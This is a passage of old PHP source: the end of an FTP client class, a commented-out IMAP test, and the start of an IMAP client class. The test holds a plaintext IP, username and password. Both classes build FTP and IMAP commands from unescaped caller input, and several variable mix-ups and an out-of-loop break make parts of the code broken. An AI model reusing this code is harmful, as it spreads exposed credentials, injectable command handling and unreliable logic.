					return false;
				}
				else
				{
					$msg=$this->_read();
					if(!$this->_checkReply())
					{
						$this->_error=$msg;
						return false;
					}
				}				
				$this->sendMsg($msg);
				return true;
			}

			function site($cmd="")
			{
				if(!$this->_ready)
				{
					$this->_error="Please login to FTP server first.";
					return false;
				}
				if(!$this->_put("SITE $cmd"))
				{
					$this->_error="Failed to send command to FTP Server.";
					return false;
				}
				else
				{
					$msg=$this->_read();
					if(!$this->_checkReply())
					{
						$this->_error=$msg;
						return false;
					}
				}				
				$this->sendMsg($msg);
				return true;
			}

			function features()
			{
				if(!$this->_ready)
				{
					$this->_error="Please login to FTP server first.";
					return false;
				}
				if(!$this->_put("FEAT"))
				{
					$this->_error="Failed to send command to FTP Server.";
					return false;
				}
				else
				{
					$msg=$this->_read();
					if(!$this->_checkReply())
					{
						$this->_error=$msg;
						return false;
					}
				}				
				$msg=preg_split("/".$this->NewLineCode[$this->OS_local]."/",$msg,-1,PREG_SPLIT_NO_EMPTY);
				$msg[0]=substr($msg[0],4);
				array_pop($msg);
				return implode($this->NewLineCode[$this->OS_local],$msg);
			}

			function mdtm($path)
			{
				if(!$this->_ready)
				{
					$this->_error="Please login to FTP server first.";
					return false;
				}
				if(!$this->_put("MDTM ".$path))
				{
					$this->_error="Failed to send command to FTP Server.";
					return false;
				}
				else
				{
					$msg=$this->_read();
					if(!$this->_checkReply())
					{
						$this->_error=$msg;
						return false;
					}
				}				
				$msg=trim(substr($msg,4));
				list($year,$month,$day,$hr,$min,$sec)=sscanf($msg,"%4d%2d%2d%2d%2d%2d");
				return mktime($hr,$min,$sec,$month,$day,$year);
			}

			function help($arg="")
			{
				if(!$this->_ready)
				{
					$this->_error="Please login to FTP server first.";
					return false;
				}
				if(!$this->_put("HELP $arg"))
				{
					$this->_error="Failed to send command to FTP Server.";
					return false;
				}
				else
				{
					$msg=$this->_read();
					if(!$this->_checkReply())
					{
						$this->_error=$msg;
						return false;
					}
				}				
				$msg=preg_split("/".$this->NewLineCode[$this->OS_local]."/",$msg,-1,PREG_SPLIT_NO_EMPTY);
				$msg[0]=substr($msg[0],4);
				array_pop($msg);
				return implode($this->NewLineCode[$this->OS_local],$msg);
			}
			
			function noop()
			{
				if(!$this->_ready)
				{
					$this->_error="Please login to FTP server first.";
					return false;
				}
				if(!$this->_put("NOOP"))
				{
					$this->_error="Failed to send command to FTP Server.";
					return false;
				}
				else
				{
					$msg=$this->_read();
					if(!$this->_checkReply())
					{
						$this->_error=$msg;
						return false;
					}
				}
				$this->sendMsg($msg);
				return true;				
			}
			
			
			function system()
			{
				if(!$this->_ready)
				{
					$this->_error="Please login to FTP server first.";
					return false;
				}
				if(!$this->_put("SYST"))
				{
					$this->_error="Failed to send command to FTP Server.";
					return false;
				}
				else
				{
					$msg=$this->_read();
					if(!$this->_checkReply())
					{
						$this->_error=$msg;
						return false;
					}
				}				
				return substr(preg_replace("/\"/","" ,$msg ),4);
			}
			
			function pwd()
			{
				if(!$this->_ready)
				{
					$this->_error="Please login to FTP server first.";
					return false;
				}
				if(!$this->_put("PWD"))
				{
					$this->_error="Failed to send command to FTP Server.";
					return false;
				}
				else
				{
					$msg=$this->_read();
					if(!$this->_checkReply())
					{
						$this->_error=$msg;
						return false;
					}
				}				
				$this->sendMsg($msg);
				return substr(preg_replace("/\"/","" ,$msg ),4);
			}

			function rawlist($arg="",$path="")
			{
				if(!$this->_ready)
				{
					$this->_error="Please login to FTP server first.";
					return false;
				}
				
				$arg=($arg?" ".$arg:"").($path?" ".$path:"");
				return $this->_list($arg);
			}

			function namelist($arg="",$path="")
			{
				if(!$this->_ready)
				{
					$this->_error="Please login to FTP server first.";
					return false;
				}
				
				$arg=($arg?" ".$arg:"").($path?" ".$path:"");
				return $this->_list($arg,"NLST");
			}
			
			function cdup()
			{
				if(!$this->_ready)
				{
					$this->_error="Please login to FTP server first.";
					return false;
				}
				if(!$this->_put("CDUP"))
				{
					$this->_error="Failed to send command to FTP Server.";
					return false;
				}
				else
				{
					$msg=$this->_read();
					if(!$this->_checkReply())
					{
						$this->_error=$msg;
						return false;
					}
				}				
				$this->sendMsg("Directory successfuly changed to parent Directory.");
				return true;
			}

			function delete($file)
			{
				if(!$this->_ready)
				{
					$this->_error="Please login to FTP server first.";
					return false;
				}
				if(!$this->_put("DELE $file"))
				{
					$this->_error="Failed to send command to FTP Server.";
					return false;
				}
				else
				{
					$msg=$this->_read();
					if(!$this->_checkReply())
					{
						$this->_error=$msg;
						return false;
					}
				}				
				$this->sendMsg($msg);
				return true;
			}
			
			function abort()
			{
				if(!$this->_ready)
				{
					$this->_error="Please login to FTP server first.";
					return false;
				}
				if(!$this->_put("ABOR"))
				{
					$this->_error="Failed to send command to FTP Server.";
					return false;
				}
				else
				{
					$msg=$this->_read();
					if(!$this->_checkReply())
					{
						$this->_error=$msg;
						return false;
					}
				}				
				$this->sendMsg($msg);
				return true;
			}

			function rename($from,$to)
			{
				if(!$this->_ready)
				{
					$this->_error="Please login to FTP server first.";
					return false;
				}
				if(!$this->_put("RNFR $from"))
				{
					$this->_error="Failed to send command to FTP Server.";
					return false;
				}
				else
				{
					$msg=$this->_read();
					if(!$this->_checkReply())
					{
						$this->_error=$msg;
						return false;
					}
				}
				$this->sendMsg($msg);
				if($this->_code==350) 
				{
					if(!$this->_put("RNTO $to"))
					{
						$this->_error="Failed to send command to FTP Server.";
						return false;
					}
					else
					{
						$msg=$this->_read();
						if(!$this->_checkReply())
						{
							$this->_error=$msg;
							return false;
						}
					}
				}
				else return FALSE;

				$this->sendMsg($msg);
				return true;
			}
			
			function restart($point)
			{
				if(!$this->_ready)
				{
					$this->_error="Please login to FTP server first.";
					return false;
				}
				if(!$this->_put("REST $point"))
				{
					$this->_error="Failed to send command to FTP Server.";
					return false;
				}
				else
				{
					$msg=$this->_read();
					if(!$this->_checkReply())
					{
						$this->_error=$msg;
						return false;
					}
				}				
				$this->sendMsg($msg);
				return true;
			}
			
			function read($remoteFile,$localFile=NULL)
			{
				$fp=null;
				if(!$this->_ready)
				{
					$this->_error="Please login to FTP server first.";
					return false;
				}
				preg_match("/\..+/",$remoteFile,$matches);
				$ext=strtolower(substr($matches[0],1));
				if($this->_type==FTP_ASCII or ($this->_type==FTP_AUTOASCII and in_array($ext,$this->AutoAsciiExt)))
				 $mode=FTP_ASCII;
				else
				 $mode=FTP_BINARY;

				$mode=FTP_BINARY;
				$this->_mode($mode); 	

				if(!$this->_listen())
				{
					$this->sendMsg("Failed to listen to server.");
				 	return false;
				}
				if($localFile==true)
					$localFile=$remoteFile;
				if(@file_exists($localFile))
					$this->sendMsg("$localFile will be overwritten.");

				if(!empty($localFile))					
				{
					$fp=fopen($localFile,"w");
					if(!$fp)
					{
						$this->_error="Couldn't open $localFile to write.";
						return false;
					}
				}
				
				if(!$this->_put("RETR $remoteFile"))
				{
					$this->_error="Failed to send command to FTP Server.";
					@fclose($fp);
					$this->_data_close();
					return false;
				}
				$msg=$this->_read();
				if(!$this->_checkReply())
				{
					$this->_error=$msg;
					@fclose($fp);
					$this->_data_close();
					return false;
				}
				$this->sendMsg($msg);
				$out=$this->_read_data($mode,$fp);

				@fclose($fp);
				$this->_data_close();

				$msg=$this->_read();
				if(!$this->_checkReply())
				{
					$this->_error=$msg;
					return false;
				}
				$this->sendMsg($msg);
				$this->sendMsg("File successfuly read.");
				return $out;
			}

			function write($localFile,$remoteFile=NULL,$unique=false)
			{
				$fp=NULL;
				if(!$this->_ready)
				{
					$this->_error="Please login to FTP server first.";
					return false;
				}
				preg_match("/\..+/",$localFile,$matches);
				$ext=strtolower(substr($matches[0],1));
				if($this->_type==FTP_ASCII or ($this->_type==FTP_AUTOASCII and in_array($ext,$this->AutoAsciiExt)))
				 $mode=FTP_ASCII;
				else
				 $mode=FTP_BINARY;

				$this->_mode($mode); 	
				$this->restart(0);

				if(!$this->_listen())
				{
					$this->sendMsg("Failed to listen to server.");
				 	return false;
				}

				if(is_null($remoteFile))
					$remoteFile=$localFile;

				if(@file_exists($localFile))					
				{
					$fp=fopen($localFile,"r");
					if(!$fp)
					{
						$this->_error="Couldn't read $localFile.";
						$this->_data_close();
						return false;
					}
				}
				else
				{
					$this->_error="Couldn't find $localFile.";
					$this->_data_close();
					return false;
				}
				
				if($unique)
					$cmd="STOU";
				else
					$cmd="STOR";
				
				if(!$this->_put("$cmd $remoteFile"))
				{
					$this->_error="Failed to send command to FTP Server.";
					$this->_data_close();
					@fclose($fp);
					return false;
				}
				$msg=$this->_read();
				if(!$this->_checkReply())
				{
					$this->_error=$msg;
					$this->_data_close();
					@fclose($fp);
					return false;
				}
				$this->sendMsg($msg);
				
				if(!$this->_write_data($mode,$fp)) return false;
				
				@fclose($fp);
				$this->_data_close();
				
				if(($msg=$this->_read())===false) return false;
				if(!$this->_checkReply())
				{
					$this->_error=$msg;
					return false;
				}
				$this->sendMsg($msg);
			}			
			function quit()
			{
				if(!$this->_ready)
				{
					$this->_error="Please login to FTP server first.";
					return false;
				}
				if(!$this->_put("QUIT"))
				{
					$this->_error="Failed to send command to FTP Server.";
					return false;
				}
				else
				{
					$msg=$this->_read();
					if(!$this->_checkReply())
					{
						$this->_error=$msg;
						return false;
					}
				}				
				$this->_ready=false;
				$this->sendMsg("Successfuly logged out.");
				return true;
			}
			
			function setTimeOut($time)
			{
				$this->_timeout=$time;
				if(!is_null($this->conn))
				{
					if(!stream_set_timeout($this->_conn,$time))
					{
						$this->_error="Couldn't set timeout.";
						$this->close();
						return false;
					}
				}
				return true;	
			}
			function setUmask($mask)
			{
				@umask(decoct($mask));
				$this->sendMsg("UMASK $mask");
			}
			
			function sendMsg($message="")
			{
				if($this->Verbose)
					return $this->_message;
				else
				    $this->_message.=$message.CRLF;
			}

			function setType($mode=FTP_AUTOASCII) 
			{
				if(!in_array($mode, $this->TransferMode)) 
				{
					$this->SendMSG("Wrong type");
					return FALSE;
				}
				$this->_type=$mode;
				$this->SendMSG("Transfer type: ".($this->_type==FTP_BINARY?"binary":($this->_type==FTP_ASCII?"ASCII":"auto ASCII") ) );
				return TRUE;
			}

			/// close the active connection
			function close($force=false)
			{
				if(!$this->quit() && !$force) return false;
				@fclose($this->_conn);
				$this->_conn=null;
				$this->_connected=false;
				$this->sendMsg("Bye.");
				return true;
			}
				
			/////Private Functions/////////			
			
			// This function is used to get response line from server
			function _get()
			{
				while(!feof($this->_conn))
				{
					$line.=@fgets($this->_conn);
					if(preg_match("/\\r?\\n$/i",$line))
						return(preg_replace("/\\r?\\n$/i","",$line));
				}
			}
			
			function _read()
			{
				$firstLine=true;
				$break=false;
				do{
					$line=$this->_get();
					if($firstLine)
					{
						$code=substr($line,0,3);
						$firstLine=false;
					}
					if(preg_match("/^($code )/",$line))
						$break=true;
					$msg.=$line.$this->NewLineCode[$this->OS_local];
				}while(!$break);
				$this->_code=$code;
				return $msg;
				//echo $this->_get();
			}

			////This functiuon is to send the command to server
			function _put($msg="")
			{
				$this->_lastaction=time();
				return fputs($this->_conn,"$msg\r\n");
			}
			function passive($pasv=NULL) 
			{
				if(is_null($pasv)) $this->_passive=!$this->_passive;
				else $this->_passive=$pasv;
				if(!$this->_port_available and !$this->_passive) {
					$this->SendMSG("Only passive connections available!");
					$this->_passive=TRUE;
					return FALSE;
				}
				$this->sendMSG("Passive mode ".($this->_passive?"on":"off"));
				return TRUE;
			}

			function _connect()
			{
				$this->sendMsg('Local OS : '.$this->OS_FullName[$this->OS_local]);
				$this->_conn=fsockopen($this->_host,$this->_port,$errno,$errstr,$this->_timeout);
				if(!$this->_conn)
				{
					$this->_error="Couldn't open a connection to ".$this->host;
					$this->_error.="\nError($errno):$errstr";
					return false;
				}
				$this->_greet=$this->_read();
				$this->_connected=true;
				return TRUE;
			}
			function _login()
			{
				if(!$this->_connected)
				{
					$this->_error="Please connect to FTP server first.";
					return false;
				}
				if(!$this->_put("USER ".$this->_user))
				{
					$this->_error="Failed to send command to FTP Server.";
					return false;
				}
				else
				{
					$msg=$this->_read();
					if(!$this->_checkReply($msg))
					{
						$this->_error=$msg;
						return false;
					}
				}
				if(!$this->_put("PASS ".$this->_password))
				{
					$this->_error="Failed to send command to FTP Server.";
					return false;
				}
				else
				{
					$msg=$this->_read();
					if(!$this->_checkReply())
					{
						$this->_error=$msg;
						return false;
					}
				}
				$this->sendMsg("Login Correct.");
				$this->_ready=true;
				return true;
			}
			function _checkReply() 
			{
				return ($this->_code<400 && $this->_code>0);
			}
			function _mode($mode)
			{
				if($mode==FTP_BINARY) {
					if(!$this->_put("TYPE I")) return FALSE;
				} else {
				if(!$this->_put("TYPE A")) return FALSE;
				}
				$msg=$this->_read();
				$this->sendMsg($msg);
			}
			function _listen()
			{
				if($this->_port_available)
				{
					$this->_datahost=$_SERVER['REMOTE_ADDR'];
					if(($this->_dataconn=@socket_create(AF_INET,SOCK_STREAM,SOL_TCP))<0)
					{
						$this->sendMsg("Couldn't make sockets for port.");
						break;
					}
					@socket_set_option($this->_dataconn,1,SO_RCVTIMEO,array("sec"=>$this->_timeout, "usec"=>0));
					@socket_set_option($this->_dataconn,1,SO_SNDTIMEO,array("sec"=>$this->_timeout, "usec"=>0));
					
					if(($ret = @socket_bind($this->_dataconn ,$this->_datahost)) < 0) 
					{
						$this->sendMsg("Couldn't bind to local socket.");
					}
					if(($ret = @socket_listen($this->_dataconn)) < 0) 
					{
						$this->sendMsg("Couldn't listen to local socket.");
					}
					if(!@socket_getsockname($this->_dataconn,$this->_datahost, $this->_dataport))
					{
						$this->sendMsg("Couldn't get information to local socket.");
					}
					$port="PORT ".preg_replace("/\./",",",$this->_datahost).",".($this->_dataport>>8).",".($this->_dataport&0x00FF);

					if($this->_put($port))
					{
						$msg=$this->_read();
						if($this->_checkReply())
						{
							$this->sendMsg($port);
							return true;
						}
						else
							$this->sendMsg($msg);
					}
				}
				if(!$this->_put("PASV"))
				{
					$this->_error="Failed to send command to Server.";
					return false;
				}
				$msg=$this->_read();
				if(!$this->_checkReply())
				{
					$this->sendMsg($msg);
					return false;
				}
				preg_match("/(\d{1,3},){5}\d{1,3}/",$msg,$matches);
				$ip_port=preg_split("/,/",$matches[0]);
				$this->_datahost=$ip_port[0].".".$ip_port[1].".".$ip_port[2].".".$ip_port[3];
    	        $this->_dataport=(((int)$ip_port[4])<<8) + ((int)$ip_port[5]);
				$this->_dataconn=@fsockopen($this->_datahost,$this->_dataport,$errno,$errstr,$this->_timeout);
				if(!$this->_dataconn)
				{
					$this->_error="Couldn't open data connection to server.";
					return false;
				}
				$this->sendMsg($msg);
				$this->_passive=true;
				return true;
			}
			
			function _read_data($mode=FTP_ASCII,$fp=NULL)
			{
				if($this->_passive)	
				{
					$out="";
					if($mode!=FTP_BINARY) 
					{
						while (!feof($this->_dataconn)) 
						{
							$line.=fread($this->_dataconn, 4096);
							if(!preg_match("/".CRLF."$/", $line)) continue;
								$line=rtrim($line,CRLF).$NewLine;
							if(is_resource($fp))
							 $out+=fwrite($fp, $line, strlen($line));
							else $out.=$line;
							$line="";
						}
					} 
					else
					{
						while (!feof($this->_dataconn)) 
						{
							$block=fread($this->_dataconn, 4096);
							if(is_resource($fp))
							 $out+=fwrite($fp, $block, strlen($block));
							else
	 						 $out.=$block;
						}
					}
					return $out;
				}
				else
				{
					$out="";
					$ftp_temp_sock=socket_accept($this->_dataconn);
					if($this->_ftp_temp_sock===FALSE)
					{
						$this->_error= socket_strerror(socket_last_error($ftp_temp_sock));
						@socket_close($this->_dataconn);
						return FALSE;
					}
					if($mode!=FTP_BINARY) 
					{
						while(($tmp=socket_read($ftp_temp_sock, 8192,PHP_NORMAL_READ))!==false) 
						{
							$line.=$tmp;
							if(!preg_match("/".CRLF."$/", $line)) continue;
							$line=rtrim($line,CRLF).$NewLine;
							if(is_resource($fp)) $out+=fwrite($fp, $line, strlen($line));
							else $out.=$line;
							echo $line;
							$line="";
						}
					} 
					else 
					{
						while($block=@socket_read($ftp_temp_sock, 8192, PHP_BINARY_READ)) 
						{
							if(is_resource($fp)) $out+=fwrite($fp, $block, strlen($block));
							else $out.=$block;
						}
					}
					@socket_close($ftp_temp_sock);
					return $out;
				}
			}
			
			function _write_data($mode=FTP_ASCII,$fp=NULL)
			{	
				if($this->_passive)
				{
					$NewLine=$this->NewLineCode[$this->OS_local];
					if(is_resource($fp)) 
					{
						while(!feof($fp)) 
						{
							$line=fgets($fp, 4096);
							if($mode!=FTP_BINARY) $line=rtrim($line, CRLF).CRLF;
							do {
								if(($res=@fwrite($this->_dataconn, $line))===FALSE) 
								{
									$this->_error="Can't write to socket";
									return FALSE;
								}
								$line=substr($line, $res);
							}while($line!="");
						}
					} 
					else
					{
						if($mode!=FTP_BINARY) $fp=rtrim($fp, $NewLine).CRLF;
						do {
							if(($res=@fwrite($this->_dataconn, $fp))===FALSE) {
								$this->_error="Can't write to socket";
								return FALSE;
							}
							$fp=substr($fp,$res);
						}while($fp!="");
					}
					return TRUE;
				}
				else
				{
					$NewLine=$this->NewLineCode[$this->OS_local];
					$ftp_temp_sock=socket_accept($this->_dataconn);
					if($this->_ftp_temp_sock===FALSE)
					{
						$this->_error= socket_strerror(socket_last_error($ftp_temp_sock));
						@socket_close($this->_dataconn);
						return FALSE;
					}
					if(is_resource($fp)) 
					{
						while(!feof($fp)) 
						{
							$line=fgets($fp, 4096);
							if($mode!=FTP_BINARY) $line=rtrim($line, CRLF).CRLF;
							do {
								if(($res=@socket_write($ftp_temp_sock, $line))===FALSE) 
								{
									$this->_error="Can't write to socket.<br>Error:".socket_strerror(socket_last_error($this->_ftp_temp_sock));
									return FALSE;
								}
								$line=substr($line, $res);
							}while($line!="");
						}
					} 
					else
					{
						if($mode!=FTP_BINARY) $fp=rtrim($fp, $NewLine).CRLF;
						do {
							if(($res=@socket_write($ftp_temp_sock, $fp))===FALSE) 
							{
								$this->_error="Can't write to socket.<br>Error:".socket_strerror(socket_last_error($this->_ftp_temp_sock));
								return FALSE;
							}
							$fp=substr($fp,$res);
						}while($fp!="");
					}
					return TRUE;
				}
				@socket_close($ftp_temp_sock);
			}
			
			function _list($arg="",$cmd="LIST")
			{
				$mode=FTP_BINARY;
				$this->_mode($mode);
				if(!$this->_listen()) return false;
				if(!$this->_put($cmd.$arg))
				{
					$this->_error="Failed to send command to FTP Server.";
					return false;
				}
				$msg=$this->_read();
				if(!$this->_checkReply())
				{
					$this->_error=$msg;
					$this->_data_close();
					return false;
				}
				$this->sendMsg($msg);
				$out=$this->_read_data($mode);
				$out=preg_split("/[".CRLF."]+/", $out, -1, PREG_SPLIT_NO_EMPTY);
				$msg=$this->_read();
				$this->_data_close();
				if(!$this->_checkReply())
				{
					$this->_error=$msg;
					return false;
				}
				$this->sendMsg($msg);
				/*$msg=$this->_read();
				if(!$this->_checkReply())
				{
					$this->_error=$msg;
					return false;
				}
				$this->sendMsg($msg);*/
				return $out;		
			}
			function _data_close()
			{
				if($this->_passive)
					@fclose($this->_dataconn);
				else
					@socket_close($this->_dataconn);
			}
		}
?>

<?php 

	 /*
	include_once("imap.inc.php");
	include_once("mimedecode.inc.php");
	$imap=new IMAPMAIL;
	if(!$imap->open("192.168.0.26","143"))
	{
		echo $imap->get_error();
		exit;
	} 

	$imap->login("harishc","hchauhan");
	echo $imap->error;
	$response=$imap->open_mailbox("INBOX");
	echo $imap->error;
	//echo $response=$imap->get_msglist();
	//echo $response=$imap->delete_message(9);
	//echo $response=$imap->rollback_delete(9);
	$response=$imap->get_message(1);


	///Decoding the mail	

	$mimedecoder=new MIMEDECODE($response,"\r\n");
	$msg=$mimedecoder->get_parsed_message();
	print_r($msg);
	//echo nl2br($response);
	echo $imap->get_error();
	$imap->close();
	//$response=$imap->fetch_mail("3","BODYSTRUCTURE");
	//print_r($response);
	//echo nl2br($response);
	//echo $imap->error;
	echo "<br>";
	 */

?>
<?php 

	 /*
	 #####################################################
	 ####                                             ####
	 ####    Author       : Harish Chauhan            ####
	 ####    Start Date   : 14 Oct,2004               ####
	 ####    End Date     : -- Oct,2004               ####
	 ####    Updated      :                           ####
	 ####                 		                      ####
	 #####################################################
	 */

	
	
	/// Constant FLAGS   
	
	define("HKC_ALL_MSG","MESSAGES"); ////USED TO RETRIVE NUMBER OF ALL MESSAGES IN MAILBOX
	define("HKC_RECENT_MSG","RECENT"); ////USED TO RETRIVE NUMBER OF RECENT MESSAGES IN MAILBOX
	define("HKC_UNSEEN_MSG","UNSEEN"); ////USED TO RETRIVE NUMBER OF UNSEEN MESSAGES IN MAILBOX
	define("HKC_UID_NEXT","UIDNEXT"); ////USED TO RETRIVE UIDNEXT NUMBER
	define("HKC_UID_VALIDITY","UIDVALIDITY"); ////USED TO RETRIVE UIDVALIDITY NUMBER

	class IMAPMAIL
	{
		var $host;  // host like 127.0.0.1 or mail.yoursite.com
		var $port;  // port default is 110 or 143
		var $user;  // user for logon
		var $password;  // user paswword
		var $state;   // variable define diffrent state of connection
		var $connection; // handle to a open connection
		var $error;  // error string
		var $must_update;
		var $tag;
		var $mail_box;

		function IMAPMAIL()
		{
			$this->host=NULL;
			$this->port=143;
			$this->user="";
			$this->password="";
			$this->state="DISCONNECTED";
			$this->connection=null;
			$this->error="";
			$this->must_update=false;
			$this->tag=uniqid("HKC");
		}
		/* This functiuon set the host
		example popmail::set_host("mail.yoursite.com") */
	
		function set_host($host)
		{
			$this->host=$host;
		}
		// This functiuon set the portt
		// example popmail::set_port(110)
		function set_port($port)
		{
			$this->port=$port;
		}
		////This functiuon is to retrive the error of last operation 
		////example popmail::get_error()
		function get_error()
		{
			if($this->error)
				return $this->error;
		}
		////This functiuon is to retrive the state of connaction 
		function get_state()
		{
			return $this->state;
		}

		///Function is used to open connection
		function open($host="",$port="")
		{
			if(!empty($host))
				$this->host=$host;
			if(!empty($port))
				$this->port=$port;
			return $this->open_connection();
		}
		
		/// close the active connection
		function close()
		{
			if($this->must_update)
				$this->close_mailbox();
			$this->logout();
			@fclose($this->connection);
			$this->connection=null;
			$this->state="DISCONNECTED";
			return true;
		}
		
		////This functiuon is to open the mailbox 
		//// Arguments 1: mailbox name 2: open as read only or read write mode.
		function open_mailbox($mailbox_name="INBOX",$read_only=false)
		{
			if($read_only)	
			{
				$result=$this->examin_mailbox($mailbox_name);
				if($result)
					$this->mail_box=$mailbox_name;
			}
			else
			{
				$result= $this->select_mailbox($mailbox_name);
				if($result)
					$this->mail_box=$mailbox_name;
			}
			return $result;	
		}
	
		//function returns the number of recent messages 
		function get_unseen_msglist()
		{
			return $this->get_list(HKC_UNSEEN_MSG);
		}
		//function returns the number of recent messages 
		function get_recent_msglist()
		{
			return $this->get_list(HKC_RECENT_MSG);
		}
		//function returns the number of all messages 
		function get_msglist()
		{
			return $this->get_list(HKC_ALL_MSG);
		}

		//function returns the number of messages 
		function get_list($flag)
		{
			$response=$this->get_status($this->mail_box,$flag);
			$response=spliti("$flag",$response);
			return intval($response[1]);
		}
		
		//function retrives the full message from server.
		function get_message_body($msgno,$uid=false)
		{
			if($uid)
				$response=$this->uid_fetch_mail($msgno,"BODY[TEXT]");
			else
				$response=$this->fetch_mail($msgno,"BODY[TEXT]");

			$temp_arr=explode("\n",$response);
			array_shift($temp_arr);
			array_shift($temp_arr);
			array_pop($temp_arr);
			array_pop($temp_arr);
			return implode("\n",$temp_arr);
		}
		
		//function retrives the full message from server.
		function get_message_header($msgno,$uid=false)
		{
			if($uid)
				$response=$this->uid_fetch_mail($msgno,"BODY[HEADER]");
			else
				$response=$this->fetch_mail($msgno,"BODY[HEADER]");

			$temp_arr=explode("\n",$response);
			array_shift($temp_arr);
			array_shift($temp_arr);
			array_pop($temp_arr);
			array_pop($temp_arr);
			return implode("\n",$temp_arr);
		}

		//function retrives the full message from server.
		function get_message($msgno,$uid=false)
		{
			if($uid)
				$response=$this->uid_fetch_mail($msgno,"BODY[]");
			else
				$response=$this->fetch_mail($msgno,"BODY[]");

			$temp_arr=explode("\n",$response);
			array_shift($temp_arr);
			array_shift($temp_arr);
			array_pop($temp_arr);
			array_pop($temp_arr);
			return implode("\n",$temp_arr);
		}
		
		//function put a delete flag the message and when you close the mail box then
		//message flagged as deleted ,Deleted Permanently
		// Example delete_message("2:4") delete the message From 2 to 4
		function delete_message($msgno)
		{
			$this->must_update=true;
			return $this->store_mail_flag($msgno,"+Flags","\\Deleted" );
		}
		
		//function put a delete flag the message
		function rollback_delete($msgno)
		{
			$this->must_update=true;
			return $this->store_mail_flag($msgno,"-Flags","\\Deleted" );
			
		}
		

		/* 
			The Functions is written bellow is the subordinate functions used in 
			communication with SERVER.
		*/
		
		// This function is used to get response line from server
		function get_line()
		{
			while(!feof($this->connection))
			{
				$line.=fgets($this->connection);
				if(strlen($line)>=2 && substr($line,-2)=="\r\n")
					return(substr($line,0,-2));
			}
		}
		////This functiuon is to retrive the full response message from server
		function get_server_responce()
		{
			while(1)
			{
				$response.="\r\n".$this->get_line();
				if(substr($response,strpos($response,$this->tag),strlen($this->tag))==$this->tag)
					break;
			}
			return $response;
		}
		////This functiuon is to send the command to server
		function put_line($msg="")
		{
			return @fputs($this->connection,"$msg\r\n");
		}

		/* 
			The Functions is written bellow is the main commands defined in IMAP
			protocol.  
		*/

		////This functiuon is to open the connection to the server 
		function open_connection()
		{
			if($this->state!="DISCONNECTED")
			{
				$this->error= "Error : Already Connected!<br>";
				return false;
			}
			if(empty($this->host) || empty($this->port))			
			{
				$this->error= "Error : Either HOST or PORT is undifined!<br>";
				return false;
			}
			$this->connection= fsockopen($this->host,$this->port,$errno,$errstr);
			if(!$this->connection)
			{
				$this->error= "Could not make a connection to server , Error : $errstr ($errno)<br>";
				return false;
			}
			$respone=$this->get_line();	
			$this->state="AUTHORIZATION";
			return true;
		}
		
		/*The get_capability function returns a listing of capabilities that the
      server supports.*/
	
		function get_capability()
		{
			if($this->state!="AUTHORIZATION")
			{
				$this->error= "Error : No Connection Found!<br>";
				return false;
			}
			if($this->put_line($this->tag." CAPABILITY"))
			{
				$response=$this->get_server_responce();
				if(substr($response,strpos($response,"$this->tag ")+strlen($this->tag)+1,2)!="OK")
				{
					$this->error= "Error : $response !<br>";
					return false;
				}
			}
			else
			{
				$this->error= "Error : Could not send User request. <br>";
				return false;
			}
			return $response;
		}
	
		/* noop function can be used as a periodic poll for new messages or
      message status updates during a period of inactivity*/
	
		function noop()
		{
			if($this->state!="AUTHORIZATION")
			{
				$this->error= "Error : No Connection Found!<br>";
				return false;
			}
			if($this->put_line($this->tag." NOOP"))
			{
				$response=$this->get_server_responce();
				if(substr($response,strpos($response,"$this->tag ")+strlen($this->tag)+1,2)!="OK")
				{
					$this->error= "Error : $response !<br>";
					return false;
				}
			}
			else
			{
				$this->error= "Error : Could not send User request. <br>";
				return false;
			}
			return true;
		}

		/* The logout function informs the server that the client is done with
      the connection. */

		function logout()
		{
		  if($this->state!="AUTHORIZATION")
		  {
				$this->error= "Error : No Connection Found!<br>";
				return false;
		  }
		  if($this->put_line($this->tag." LOGOUT"))
			{
				$response=$this->get_server_responce();
				if(substr($response,strpos($response,"$this->tag ")+strlen($this->tag)+1,2)!="OK")
				{
					$this->error= "Error : $response !<br>";
					return false;
				}
			}
			else
			{
				$this->error= "Error : Could not send User request. <br>";
				return false;
			}
			return true;
		}
			/// This function is used to authenticate the user
			// arguments $auth_str is a authorization String example LOGIN
			// $ans_str1 and $ans_str2 is a base 64 encoded answer string to server
			// Example if it authentication type is login then user your userid and password
			// as ans_str1 and ans_str2
			
		function authenticate($auth_str,$ans_str1="",$ans_str2="")
		{
			if($this->state=="DISCONNECTED")
			{
				$this->error= "Error : No Connection Found!<br>";
				return false;
			}
			if($this->state=="AUTHENTICATED")
			{
				$this->error= "Error : Already Authenticated!<br>";
				return false;
			}
			if($this->put_line($this->tag." AUTHENTICATE $auth_str"))
			{
				$response=$this->get_line();
				if(strtok($response," ")=="+")
				{
				   $ans_str1=base64_encode($ans_str1);
				   $this->put_line($ans_str1);
				}
				else
				{
					$this->error= "Error : $response !<br>";
					return false;
				}
				$response=$this->get_line();
				if(strtok($response," ")=="+")
				{
					$ans_str2=base64_encode($ans_str2);
					$this->put_line($ans_str2);
				}
				else
				{
					$this->error= "Error : $response !<br>";
					return false;
				}
				$response=$this->get_line();
				if(substr($response,strpos($response,"$this->tag ")+strlen($this->tag)+1,2)!="OK")
				{
					$this->error= "Error : $response !<br>";
					return false;
				}
			}
			else
			{
				$this->error= "Error : Could not send User request. <br>";
				return false;
			}
			$this->state="AUTHENTICATED";
			return $response;
		}
		///// this function is used to login into server
		/// $user is a valid username and $pwd is a valid password.
		function login($user,$pwd)
		{
			if($this->state=="DISCONNECTED")
			{
				$this->error= "Error : No Connection Found!<br>";
				return false;
			}
			if($this->state=="AUTHENTICATED")
			{
				$this->error= "Error : Already Authenticated!<br>";
				return false;
			}
			if($this->put_line($this->tag." LOGIN $user $pwd"))
			{
				$response=$this->get_server_responce();
				
				if(substr($response,strpos($response,"$this->tag ")+strlen($this->tag)+1,2)!="OK")
				{
					$this->error= "Error : $response !<br>";
					return false;
				}
			}
			else
			{
				$this->error= "Error : Could not send User request. <br>";
				return false;
			}
			$this->state="AUTHENTICATED";
			return true;
		}
	
	   /*   The select_mailbox command selects a mailbox so that messages in the
	   mailbox can be accessed. */ 
		function select_mailbox($mailbox_name)
			{
		  if($this->state=="AUTHORIZATION")
		  {
					$this->error= "Error : User is not authorised or logged in.!<br>";
					return false;
		  }
		  if($this->put_line($this->tag." SELECT $mailbox_name"))
			{
				$response=$this->get_server_responce();
				if(substr($response,strpos($response,"$this->tag ")+strlen($this->tag)+1,2)!="OK")
				{
					$this->error= "Error : $response !<br>";
					return false;
				}
			}
			else
			{
				$this->error= "Error : Could not send User request. <br>";
				return false;
			}
			$this->state="SELECTED";
			return $response;
